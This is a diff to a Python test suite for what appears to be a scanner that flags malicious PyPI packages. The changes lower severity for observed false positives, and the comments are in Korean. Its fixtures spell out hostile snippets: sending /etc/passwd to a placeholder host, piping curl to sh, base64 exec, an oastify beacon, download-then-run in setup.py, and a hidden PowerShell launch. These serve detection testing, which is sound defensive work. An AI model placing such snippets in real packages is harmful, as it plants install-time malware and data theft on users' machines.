@@ -1212,10 +1212,11 @@ _PS = "import subprocess\ndef main():\n    subprocess.Popen('powershell -w hidde
          "p/__init__.py": "", "p/cli.py": _PS},
     ],
 )
-def test_entrypoint_running_suspicious_command_is_high(files):
+def test_entrypoint_running_suspicious_command_is_medium_context(files):
+    """사용자가 실행하는 CLI — 실제 악성 0건·신규 업로드 오탐 4건이라 정황(MEDIUM)으로만."""
     hits = [f for f in analyze_files({"p-1/PKG-INFO": "Name: p", **files})
             if f.rule == RULE_ENTRYPOINT]
-    assert len(hits) == 1 and hits[0].severity is Severity.HIGH
+    assert len(hits) == 1 and hits[0].severity is Severity.MEDIUM
     assert hits[0].location.endswith("p/cli.py:3")
 
 
@@ -1254,3 +1255,203 @@ def test_entrypoint_downloader_alone_is_normal(cmd, high):
              "p-1/p/__init__.py": "",
              "p-1/p/cli.py": f"import subprocess\ndef main(url='u', f='o'):\n    {cmd}\n"}
     assert (RULE_ENTRYPOINT in {f.rule for f in analyze_files(files)}) is high
+
+
+# ── 신규 업로드 실측 오탐 (docs/eval/watch-new-uploads.md) ──────────────────
+
+_WHEEL = {"p-1.dist-info/WHEEL": "Wheel-Version: 1.0\n"}
+
+
+def _pth(files: dict[str, str]):
+    return [f for f in analyze_files(files) if f.rule == RULE_PTH]
+
+
+def test_pth_importing_own_module_is_medium_and_module_is_still_checked():
+    """dagz·quantark 등 — 자기 배포물 모듈을 import 하는 한 줄은 의도된 시작 훅이다.
+    대신 그 모듈의 최상단은 (휠 루트 단일 모듈이어도) import 시점 코드로 검사한다."""
+    files = {**_WHEEL, "zzzz_p_bootstrap.pth": "import _p_startup\n",
+             "_p_startup.py": "x = 1\n"}
+    [f] = _pth(files)
+    assert f.severity is Severity.MEDIUM
+    files["_p_startup.py"] = "import requests\nrequests.post('http://x', data='h')\n"
+    assert RULE_INSTALL_TIME in {f.rule for f in analyze_files(files)
+                                 if f.severity is Severity.HIGH}
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "import _p_startup; _p_startup.go()",          # 인라인 코드가 붙음
+        "import os, subprocess; os.system('id')",
+        "import evil_not_in_this_dist",                 # 같은 배포물에 없는 모듈
+        "import base64;exec(base64.b64decode('aWQ='))",
+    ],
+)
+def test_pth_with_code_or_foreign_import_stays_high(line):
+    files = {**_WHEEL, "x.pth": line + "\n", "_p_startup.py": "x = 1\n"}
+    assert [f.severity for f in _pth(files)] == [Severity.HIGH]
+
+
+from engine.rules.install_time import RULE_BENIGN_NET  # noqa: E402
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # rubka·sigmaflow — import 시 PyPI 로 최신 버전 확인
+        {**_INIT, "p-1/pkg/__init__.py": "import requests\n"
+         "def _check():\n    requests.get(f'https://pypi.org/pypi/{__name__}/json', timeout=2)\n"
+         "_check()\n"},
+        {**_INIT, "p-1/pkg/__init__.py": "import socket\n"
+         "socket.create_connection(('localhost', 11434), timeout=0.2)\n"},
+        # ai-edge-litert-sdk-* — setup.py 가 SDK 를 받기만 하고 실행하지 않는다
+        {"p-1/setup.py": "from urllib.request import urlretrieve\nURL = 'https://x/sdk.tgz'\n"
+                         "urlretrieve(URL, 'vendor/sdk.tgz')\nsetup(name='p')\n"},
+    ],
+)
+def test_version_check_and_download_only_are_medium(files):
+    found = _install_time_findings(files) + [
+        f for f in analyze_files({"p-1/PKG-INFO": "Name: p", **files}) if f.rule == RULE_BENIGN_NET]
+    assert any(f.rule == RULE_BENIGN_NET for f in found)
+    assert RULE_INSTALL_TIME not in _high_rules(files)
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        # 받아서 실행 — 같은 setup.py 범위에 실행이 있다
+        "from urllib.request import urlretrieve\nimport os\n"
+        "urlretrieve('https://x/a.bin', 'a.bin')\nos.startfile('a.bin')\n",
+        "from urllib.request import urlretrieve\nimport subprocess\n"
+        "urlretrieve('https://x/a', '/tmp/a')\nsubprocess.Popen(['/tmp/a'])\n",
+        # 실행 파일·시작 프로그램 폴더로 저장 (다음 로그인 때 실행)
+        "from urllib.request import urlretrieve\nurlretrieve('https://x/u', 'update.exe')\n",
+        # 호스트 정보를 실어 보낼 수 있게 URL 을 조립
+        "import socket\nfrom urllib.request import urlretrieve\n"
+        "urlretrieve('https://x/?h=' + socket.gethostname(), 'f')\n",
+        # 상수 주소 GET — 의존성 혼동 PoC 의 비콘 형태
+        "import requests\nrequests.get('https://abc.oastify.com')\n",
+        # PyPI 가 아닌 곳으로 보내는 버전 확인 모양
+        "import requests\nrequests.get('https://pypi.org.evil.example/x')\n",
+    ],
+)
+def test_download_then_run_or_beacon_stays_high(src):
+    assert RULE_INSTALL_TIME in _high_rules({"p-1/setup.py": src})
+
+
+def _vendored(source: str, ns: str = ", multiCMD.__dict__") -> str:
+    import base64
+    import lzma
+
+    blob = base64.a85encode(lzma.compress(source.encode())).decode()
+    return (f"import base64, lzma, types\nmultiCMD = types.ModuleType('multiCMD')\n"
+            f"exec(lzma.decompress(base64.a85decode({blob!r})){ns})\n")
+
+
+_LIB = "import subprocess\ndef run(cmd):\n    return subprocess.run(cmd, shell=True)\n"
+
+
+def _obf(src: str):
+    return [f for f in analyze_files({"p-1/setup.py": "", "p-1/PKG-INFO": "Name: p",
+                                      "p-1/hpcp.py": src}) if f.rule == RULE_OBFUSCATED]
+
+
+def test_vendored_library_blob_into_module_namespace_is_medium():
+    """hpcp·statblk·statbtrfs — 자기 라이브러리를 다른 모듈 네임스페이스에 심는다. 해독해 보니
+    함수 정의뿐(subprocess 는 함수 안)이라 import 시점 위험 행위가 없다."""
+    assert [f.severity for f in _obf(_vendored(_LIB))] == [Severity.MEDIUM]
+
+
+@pytest.mark.parametrize(
+    ("source", "ns"),
+    [
+        (_LIB, ""),                                   # 네임스페이스 없이 exec — 그대로 HIGH
+        (_LIB, ", globals()"),
+        ("import requests\nrequests.post('http://x', data=open('/etc/passwd').read())\n",
+         ", multiCMD.__dict__"),                      # 해독된 소스가 import 시점에 유출
+        ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", ", multiCMD.__dict__"),
+        ("import os\nos.system('curl http://x | sh')\n", ", multiCMD.__dict__"),
+    ],
+)
+def test_blob_that_acts_at_import_or_runs_in_globals_stays_high(source, ns):
+    assert Severity.HIGH in [f.severity for f in _obf(_vendored(source, ns))]
+
+
+def test_install_hook_that_only_downloads_is_medium():
+    """haddock3 — install 훅이 데이터 파일을 내려받기만 한다."""
+    src = ("from setuptools.command.install import install\n"
+           "from urllib.request import urlretrieve\n"
+           "class I(install):\n    def run(self):\n        urlretrieve('https://x/data.bin', 'd')\n"
+           "        install.run(self)\nsetup(cmdclass={'install': I})\n")
+    hooks = [f for f in analyze_files({"p-1/PKG-INFO": "Name: p", "p-1/setup.py": src})
+             if f.rule == RULE_INSTALL_HOOK]
+    assert [f.severity for f in hooks] == [Severity.MEDIUM]
+    assert _high_rules({"p-1/setup.py": src}) == set()
+    # 받고 실행하면 둘 다 HIGH
+    run = src.replace("        install.run(self)\n",
+                      "        import os; os.system('./d')\n        install.run(self)\n")
+    assert {RULE_INSTALL_HOOK, RULE_INSTALL_TIME} <= _high_rules({"p-1/setup.py": run})
+
+
+def test_pth_loading_a_flagged_own_module_stays_high():
+    """.pth 가 자기 모듈을 import 해도 그 모듈에 HIGH 가 있으면 지속성 장치라 HIGH
+    (samples/sample5_mcp_typosquat 구조)."""
+    files = {**_WHEEL, "p.pth": "import p._telemetry\n", "p/__init__.py": "",
+             "p/_telemetry.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"}
+    assert [f.severity for f in _pth(files)] == [Severity.HIGH]
+
+
+@pytest.mark.parametrize(
+    ("files", "sev"),
+    [
+        # dagz — 자기 모듈 함수를 부르는 시작 훅, 그 함수는 조용하다
+        ({**_WHEEL, "zzzz_d.pth": "import d.sensor.boot; d.sensor.boot.bootstrap()\n",
+          "d/__init__.py": "", "d/sensor/__init__.py": "",
+          "d/sensor/boot.py": "import sys\ndef bootstrap():\n    sys.setprofile(None)\n"},
+         Severity.MEDIUM),
+        # nvidia-cutlass-dsl — 경로 추가
+        ({**_WHEEL, "n.pth": "import sys, os, n; sys.path.insert(0, os.path.join("
+          "n.__path__[0], 'pk'))\n", "n/__init__.py": ""}, Severity.MEDIUM),
+        # 부르는 자기 모듈 함수가 프로세스를 띄운다
+        ({**_WHEEL, "g.pth": "import g; g.install()\n",
+          "g/__init__.py": "import subprocess\ndef install():\n    subprocess.Popen(['x'])\n"},
+         Severity.HIGH),
+        # 다른 모듈의 함수를 부른다
+        ({**_WHEEL, "g.pth": "import g, os; os.system('id')\n", "g/__init__.py": ""},
+         Severity.HIGH),
+    ],
+)
+def test_pth_startup_hook_forms(files, sev):
+    assert [f.severity for f in _pth(files)] == [sev]
+
+
+@pytest.mark.parametrize(
+    ("src", "high"),
+    [
+        # rubka — 지역 변수에 담은 PyPI 주소
+        ("import requests\ndef latest(n):\n    url = f'https://pypi.org/pypi/{n}/json'\n"
+         "    return requests.get(url, timeout=3)\nlatest('p')\n", False),
+        # 같은 이름에 다른 주소도 대입된다
+        ("import requests\nurl = 'https://pypi.org/x'\nurl = 'https://evil.example/c'\n"
+         "requests.get(url)\n", True),
+        # matplotlib — URL 이면 받고 아니면 파일을 여는 도우미
+        ("import urllib.request\ndef _open(fname):\n"
+         "    if fname.startswith(('http://', 'https://')):\n"
+         "        return urllib.request.urlopen(fname)\n    return open(fname)\n"
+         "RC = _open('matplotlibrc')\n", False),
+    ],
+)
+def test_registry_variable_and_url_or_file_helper(src, high):
+    files = {**_INIT, "p-1/pkg/__init__.py": src}
+    assert (RULE_INSTALL_TIME in _high_rules(files)) is high
+
+
+def test_vendored_blob_with_decode_utf8_is_medium():
+    """hpcp 실제 형태: exec(lzma.decompress(base64.a85decode(_SRC)).decode("utf-8"), m.__dict__)"""
+    import base64
+    import lzma
+
+    blob = base64.a85encode(lzma.compress(_LIB.encode())).decode()
+    src = (f"import base64, lzma, types\nmultiCMD = types.ModuleType('m')\n_SRC = {blob!r}\n"
+           "exec(lzma.decompress(base64.a85decode(_SRC)).decode('utf-8'), multiCMD.__dict__)\n")
+    assert [f.severity for f in _obf(src)] == [Severity.MEDIUM]
